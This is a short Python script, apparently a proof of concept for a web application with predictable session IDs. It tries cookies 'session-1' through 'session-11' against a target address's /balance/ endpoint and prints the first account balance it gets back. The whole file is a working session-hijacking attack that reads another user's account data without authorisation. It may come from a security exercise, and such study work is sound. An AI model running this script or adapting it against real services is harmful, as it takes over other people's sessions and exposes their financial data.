import sys
import requests
import json

def test_session(address):
    id_guess = 1
    balance = None

    while id_guess <= 11:
        session_id = "session-" + str(id_guess)
        cookies = {'sessionid': session_id}
        response = requests.get(address + '/balance/', cookies=cookies)

        data = json.loads(response.text)
        balance = data.get('balance')
        if balance:
            return balance
        id_guess += 1


def main(argv):
    address = sys.argv[1]
    print(test_session(address))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('usage: python %s address' % sys.argv[0])
    else:
        main(sys.argv)
